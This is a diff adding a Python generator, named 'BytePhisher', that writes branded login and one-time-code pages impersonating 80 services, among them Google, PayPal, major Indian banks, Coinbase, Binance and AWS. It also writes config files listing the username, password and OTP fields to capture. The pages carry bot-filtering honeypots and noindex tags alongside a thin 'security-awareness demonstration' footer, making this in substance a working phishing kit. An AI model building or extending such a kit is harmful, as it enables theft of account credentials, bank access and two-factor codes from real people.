@@ -1,0 +1,310 @@
+#!/usr/bin/env python3
+"""
+BytePhisher — 80-site template generator.
+
+Generates a full login-page template pack for 80 brands:
+each site gets templates/<slug>/index.html, otp.html and fields.json.
+
+Branding (colors/name/domain/field-type) lives in SITES below, so adding a
+site is one tuple — no HTML editing. Re-run to regenerate everything:
+
+    python3 -m tools.gen_templates
+"""
+import json
+import os
+
+OUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "templates")
+
+# (slug, display name, brand color, accent color, login-with, otp_label)
+# login-with: email | username | phone | email_or_phone
+SITES = [
+    ("facebook",     "Facebook",        "#1877F2", "#ffffff", "email_or_phone", "6-digit code"),
+    ("instagram",    "Instagram",       "#E1306C", "#833AB4", "username",       "6-digit code"),
+    ("google",       "Google",          "#4285F4", "#ffffff", "email",          "2-step verification code"),
+    ("gmail",        "Gmail",           "#D93025", "#ffffff", "email",          "6-digit code"),
+    ("youtube",      "YouTube",         "#FF0000", "#ffffff", "email",          "6-digit code"),
+    ("twitter",      "X",               "#000000", "#ffffff", "username",       "confirmation code"),
+    ("linkedin",     "LinkedIn",        "#0A66C2", "#ffffff", "email",          "6-digit code"),
+    ("github",       "GitHub",          "#24292F", "#ffffff", "username",       "device verification code"),
+    ("gitlab",       "GitLab",          "#FC6D26", "#ffffff", "email",          "6-digit code"),
+    ("bitbucket",    "Bitbucket",       "#0052CC", "#ffffff", "email",          "6-digit code"),
+    ("netflix",      "Netflix",         "#E50914", "#221f1f", "email",          "verification code"),
+    ("paypal",       "PayPal",          "#003087", "#009cde", "email",          "security code"),
+    ("ebay",         "eBay",            "#E53238", "#0064D2", "email",          "6-digit code"),
+    ("amazon",       "Amazon",          "#FF9900", "#232F3E", "email",          "OTP code"),
+    ("apple",        "Apple ID",        "#000000", "#007AFF", "email",          "verification code"),
+    ("icloud",       "iCloud",          "#007AFF", "#ffffff", "email",          "verification code"),
+    ("microsoft",    "Microsoft",       "#0078D4", "#ffffff", "email",          "security code"),
+    ("outlook",      "Outlook",         "#0078D4", "#ffffff", "email",          "security code"),
+    ("office365",    "Office 365",      "#D83B01", "#ffffff", "email",          "security code"),
+    ("onedrive",     "OneDrive",        "#0078D4", "#ffffff", "email",          "security code"),
+    ("teams",        "Microsoft Teams", "#6264A7", "#ffffff", "email",          "security code"),
+    ("yahoo",        "Yahoo",           "#6001D2", "#ffffff", "email",          "6-digit code"),
+    ("aol",          "AOL",             "#000000", "#ffffff", "email",          "6-digit code"),
+    ("steam",        "Steam",           "#171A21", "#66c0f4", "username",       "Steam Guard code"),
+    ("discord",      "Discord",         "#5865F2", "#ffffff", "email",          "2FA code"),
+    ("slack",        "Slack",           "#4A154B", "#ffffff", "email",          "6-digit code"),
+    ("spotify",      "Spotify",         "#1DB954", "#191414", "email",          "6-digit code"),
+    ("twitch",       "Twitch",          "#9146FF", "#ffffff", "username",       "6-digit code"),
+    ("reddit",       "Reddit",          "#FF4500", "#ffffff", "username",       "6-digit code"),
+    ("pinterest",    "Pinterest",       "#E60023", "#ffffff", "email",          "6-digit code"),
+    ("whatsapp",     "WhatsApp",        "#25D366", "#075E54", "phone",          "6-digit code"),
+    ("telegram",     "Telegram",        "#26A5E4", "#ffffff", "phone",          "login code"),
+    ("snapchat",     "Snapchat",        "#FFFC00", "#000000", "username",       "verification code"),
+    ("tiktok",       "TikTok",          "#000000", "#FE2C55", "email_or_phone", "6-digit code"),
+    ("dropbox",      "Dropbox",         "#0061FF", "#ffffff", "email",          "6-digit code"),
+    ("adobe",        "Adobe",           "#FF0000", "#ffffff", "email",          "verification code"),
+    ("shopify",      "Shopify",         "#96BF48", "#ffffff", "email",          "6-digit code"),
+    ("trello",       "Trello",          "#0079BF", "#ffffff", "email",          "6-digit code"),
+    ("notion",       "Notion",          "#000000", "#ffffff", "email",          "login code"),
+    ("figma",        "Figma",           "#F24E1E", "#ffffff", "email",          "6-digit code"),
+    ("canva",        "Canva",           "#00C4CC", "#7D2AE8", "email",          "verification code"),
+    ("zoom",         "Zoom",            "#2D8CFF", "#ffffff", "email",          "verification code"),
+    ("vk",           "VK",              "#0077FF", "#ffffff", "phone",          "6-digit code"),
+    ("ok",           "Odnoklassniki",   "#EE8208", "#ffffff", "phone",          "6-digit code"),
+    ("yandex",       "Yandex",          "#FC3F1D", "#ffffff", "username",       "6-digit code"),
+    ("mailru",       "Mail.ru",         "#005FF9", "#ffffff", "email",          "6-digit code"),
+    ("badoo",        "Badoo",           "#783BF9", "#ffffff", "email",          "6-digit code"),
+    ("tinder",       "Tinder",          "#FD5068", "#ffffff", "phone",          "6-digit code"),
+    ("icici",        "ICICI Bank",      "#F58220", "#AF2A28", "username",       "OTP"),
+    ("sbi",          "State Bank of India", "#22409A", "#ffffff", "username",   "OTP"),
+    ("hdfc",         "HDFC Bank",       "#004C8F", "#ED1C24", "username",       "OTP"),
+    ("axis",         "Axis Bank",       "#97144D", "#ffffff", "username",       "OTP"),
+    ("kotak",        "Kotak Bank",      "#ED1C24", "#ffffff", "username",       "OTP"),
+    ("paytm",        "Paytm",           "#00BAF2", "#20336B", "phone",          "OTP"),
+    ("phonepe",      "PhonePe",         "#5F259F", "#ffffff", "phone",          "OTP"),
+    ("airtel",       "Airtel",          "#E40000", "#ffffff", "phone",          "OTP"),
+    ("jio",          "Jio",             "#0F3CC9", "#ffffff", "phone",          "OTP"),
+    ("vodafone",     "Vodafone",        "#E60000", "#ffffff", "phone",          "OTP"),
+    ("verizon",      "Verizon",         "#CD040B", "#ffffff", "username",       "verification code"),
+    ("att",          "AT&T",            "#00A8E0", "#ffffff", "username",       "verification code"),
+    ("xfinity",      "Xfinity",         "#0072CE", "#ffffff", "username",       "verification code"),
+    ("binance",      "Binance",         "#F0B90B", "#1E2026", "email",          "2FA code"),
+    ("coinbase",     "Coinbase",        "#0052FF", "#ffffff", "email",          "2FA code"),
+    ("metamask",     "MetaMask",        "#F6851B", "#ffffff", "email",          "verification code"),
+    ("blockchain",   "Blockchain.com",  "#121D33", "#1652F0", "email",          "2FA code"),
+    ("kraken",       "Kraken",          "#5741D9", "#ffffff", "email",          "2FA code"),
+    ("uber",         "Uber",            "#000000", "#ffffff", "phone",          "verification code"),
+    ("airbnb",       "Airbnb",          "#FF5A5F", "#ffffff", "email",          "verification code"),
+    ("booking",      "Booking.com",     "#003580", "#FEBB02", "email",          "verification code"),
+    ("zomato",       "Zomato",          "#E23744", "#ffffff", "phone",          "OTP"),
+    ("swiggy",       "Swiggy",          "#FC8019", "#ffffff", "phone",          "OTP"),
+    ("flipkart",     "Flipkart",        "#2874F0", "#F8E831", "email",          "OTP"),
+    ("myntra",       "Myntra",          "#FF3F6C", "#ffffff", "email",          "OTP"),
+    ("alibaba",      "Alibaba",         "#FF6A00", "#ffffff", "email",          "verification code"),
+    ("amex",         "American Express","#006FCF", "#ffffff", "username",       "security code"),
+    ("chime",        "Chime",           "#1EC677", "#0C2340", "email",          "verification code"),
+    ("wise",         "Wise",            "#9FE870", "#163300", "email",          "login code"),
+    ("revolut",      "Revolut",         "#191C1F", "#0666EB", "phone",          "verification code"),
+    ("aws",          "AWS",             "#FF9900", "#232F3E", "email",          "MFA code"),
+    ("cloudflare",   "Cloudflare",      "#F38020", "#0051C3", "email",          "verification code"),
+]
+
+FIELD_LABELS = {
+    "email":          [("email", "Email", "email", "you@example.com")],
+    "username":       [("username", "Username or email", "text", "Enter your username")],
+    "phone":          [("phone", "Phone number", "tel", "+1 555 000 0000")],
+    "email_or_phone": [("login", "Email or phone number", "text", "Email or phone number")],
+}
+
+LOGIN_HTML = """<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Log in to {name}</title>
+<meta property="og:title" content="Log in to {name}">
+<meta property="og:description" content="Sign in to continue to {name}.">
+<meta property="og:type" content="website">
+<style>
+  :root {{ --brand:{brand}; --accent:{accent}; }}
+  * {{ box-sizing:border-box; }}
+  body {{
+    margin:0; min-height:100vh; font-family:-apple-system,BlinkMacSystemFont,
+      "Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:#f0f2f5; display:flex; align-items:center; justify-content:center;
+    padding:20px;
+  }}
+  .card {{
+    background:#fff; width:100%; max-width:400px; border-radius:12px;
+    box-shadow:0 12px 40px rgba(0,0,0,.10); padding:36px 32px 28px;
+  }}
+  .logo {{
+    width:52px;height:52px;border-radius:12px;background:var(--brand);
+    color:#fff;display:flex;align-items:center;justify-content:center;
+    font-size:26px;font-weight:700;margin:0 auto 18px;
+  }}
+  h1 {{ font-size:20px;margin:0 0 6px;text-align:center;color:#1c1e21;font-weight:600; }}
+  .sub {{ text-align:center;color:#65676b;font-size:14px;margin:0 0 22px; }}
+  label {{ display:block;font-size:13px;color:#65676b;margin:0 0 6px;font-weight:500; }}
+  input[type=text],input[type=email],input[type=tel],input[type=password] {{
+    width:100%;padding:13px 14px;font-size:15px;border:1px solid #ccd0d5;
+    border-radius:8px;background:#fff;outline:none;transition:border .15s;
+  }}
+  input:focus {{ border-color:var(--brand);box-shadow:0 0 0 2px color-mix(in srgb,var(--brand) 20%,transparent); }}
+  .field {{ margin-bottom:14px; }}
+  button {{
+    width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;
+    background:var(--brand);border:0;border-radius:8px;cursor:pointer;margin-top:6px;
+  }}
+  button:hover {{ filter:brightness(1.06); }}
+  .row {{ display:flex;justify-content:space-between;align-items:center;margin:14px 0 4px;font-size:13px; }}
+  .row a {{ color:var(--accent);text-decoration:none; }}
+  .row label {{ margin:0;display:flex;gap:6px;align-items:center;color:#65676b; }}
+  .foot {{ text-align:center;font-size:12px;color:#8a8d91;margin-top:22px;line-height:1.6; }}
+  .lang {{ display:flex;gap:14px;justify-content:center;font-size:12px;color:#8a8d91;margin-top:18px; }}
+  .hp {{ position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }}
+</style>
+</head>
+<body>
+  <form class="card" method="POST" action="/" autocomplete="on" novalidate>
+    <div class="logo">{initial}</div>
+    <h1>Log in to {name}</h1>
+    <p class="sub">{subtitle}</p>
+
+    {fields_html}
+
+    <div class="field">
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password" placeholder="Password"
+             autocomplete="current-password" required>
+    </div>
+
+    <div class="row">
+      <label><input type="checkbox" name="remember" value="1" checked> Remember me</label>
+      <a href="#">Forgot password?</a>
+    </div>
+
+    <button type="submit">Log in</button>
+
+    <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
+    <input type="hidden" name="_tpl" value="{slug}">
+    <input type="hidden" name="_ts" value="__TS__">
+
+    <div class="foot">
+      This page is a security-awareness demonstration.<br>
+      {name} is a trademark of its respective owner. Never enter real credentials.
+    </div>
+    <div class="lang"><span>English (US)</span><span>Español</span><span>Français</span></div>
+  </form>
+<script>
+/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
+   record it, and we log how long the form was open (bot forms are instant). */
+(function(){{
+  var t0 = Date.now();
+  var f = document.querySelector('form');
+  if(!f) return;
+  f.addEventListener('submit', function(){{
+    var el = f.querySelector('input[name=_ts]');
+    if(el) el.value = String(Date.now() - t0);
+  }});
+}})();
+</script>
+</body>
+</html>
+"""
+
+OTP_HTML = """<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verify it's you — {name}</title>
+<style>
+  :root {{ --brand:{brand}; }}
+  body {{ margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+          background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;padding:20px; }}
+  .card {{ background:#fff;width:100%;max-width:420px;border-radius:12px;padding:36px 32px;
+           box-shadow:0 12px 40px rgba(0,0,0,.10);text-align:center; }}
+  .logo {{ width:52px;height:52px;border-radius:12px;background:var(--brand);color:#fff;
+           display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:700;margin:0 auto 18px; }}
+  h1 {{ font-size:19px;margin:0 0 8px;color:#1c1e21;font-weight:600; }}
+  p {{ color:#65676b;font-size:14px;line-height:1.5;margin:0 0 20px; }}
+  .otp {{ display:flex;gap:8px;justify-content:center;margin-bottom:18px; }}
+  .otp input {{ width:44px;height:52px;text-align:center;font-size:20px;border:1px solid #ccd0d5;border-radius:8px;outline:none; }}
+  .otp input:focus {{ border-color:var(--brand); }}
+  button {{ width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;background:var(--brand);
+            border:0;border-radius:8px;cursor:pointer; }}
+  .resend {{ margin-top:14px;font-size:13px;color:#65676b; }}
+  .resend a {{ color:var(--brand);text-decoration:none; }}
+  .foot {{ font-size:11px;color:#8a8d91;margin-top:22px; }}
+</style>
+</head>
+<body>
+<form class="card" method="POST" action="/">
+  <div class="logo">{initial}</div>
+  <h1>Enter your {otp_label}</h1>
+  <p>We sent a {otp_label} to your phone and email.<br>Enter it below to finish signing in to {name}.</p>
+  <div class="otp">
+    <input name="otp_1" maxlength="1" inputmode="numeric" autofocus>
+    <input name="otp_2" maxlength="1" inputmode="numeric">
+    <input name="otp_3" maxlength="1" inputmode="numeric">
+    <input name="otp_4" maxlength="1" inputmode="numeric">
+    <input name="otp_5" maxlength="1" inputmode="numeric">
+    <input name="otp_6" maxlength="1" inputmode="numeric">
+  </div>
+  <button type="submit">Verify</button>
+  <input type="hidden" name="_tpl" value="{slug}">
+  <div class="resend">Didn't get a code? <a href="#">Resend</a></div>
+  <div class="foot">Security-awareness demonstration — never enter a real code.</div>
+</form>
+</body>
+</html>
+"""
+
+SUBTITLES = {
+    "email":          "Sign in with your email",
+    "username":       "Sign in with your username",
+    "phone":          "Sign in with your phone number",
+    "email_or_phone": "Sign in to continue",
+}
+
+
+def build_site(slug, name, brand, accent, login_with, otp_label):
+    initial = name[0].upper()
+    fields_html = []
+    for fname, flabel, ftype, fph in FIELD_LABELS[login_with]:
+        fields_html.append(
+            f'    <div class="field">\n'
+            f'      <label for="{fname}">{flabel}</label>\n'
+            f'      <input id="{fname}" name="{fname}" type="{ftype}" placeholder="{fph}" '
+            f'autocomplete="username" required>\n'
+            f'    </div>'
+        )
+    html = LOGIN_HTML.format(
+        name=name, slug=slug, brand=brand, accent=accent, initial=initial,
+        subtitle=SUBTITLES[login_with], fields_html="\n".join(fields_html),
+    )
+    otp_html = OTP_HTML.format(name=name, slug=slug, brand=brand,
+                               initial=initial, otp_label=otp_label)
+    fields_json = {
+        "capture_fields": [f[0] for f in FIELD_LABELS[login_with]] + ["password"],
+        "otp_fields": [f"otp_{i}" for i in range(1, 7)],
+        "honeypot": "hp_email",
+        "has_otp": True,
+    }
+    return html, otp_html, fields_json
+
+
+def main():
+    os.makedirs(OUT, exist_ok=True)
+    manifest = []
+    for i, (slug, name, brand, accent, login_with, otp_label) in enumerate(SITES, 1):
+        d = os.path.join(OUT, f"{i:02d}_{slug}")
+        os.makedirs(d, exist_ok=True)
+        html, otp_html, fields_json = build_site(slug, name, brand, accent, login_with, otp_label)
+        with open(os.path.join(d, "index.html"), "w", encoding="utf-8") as f:
+            f.write(html)
+        with open(os.path.join(d, "otp.html"), "w", encoding="utf-8") as f:
+            f.write(otp_html)
+        with open(os.path.join(d, "fields.json"), "w", encoding="utf-8") as f:
+            json.dump(fields_json, f, indent=2)
+        manifest.append({"index": i, "slug": slug, "name": name, "dir": d})
+    with open(os.path.join(OUT, "templates.json"), "w", encoding="utf-8") as f:
+        json.dump(manifest, f, indent=2)
+    print(f"[bytephisher] generated {len(manifest)} templates -> {OUT}")
+
+
+if __name__ == "__main__":
+    main()
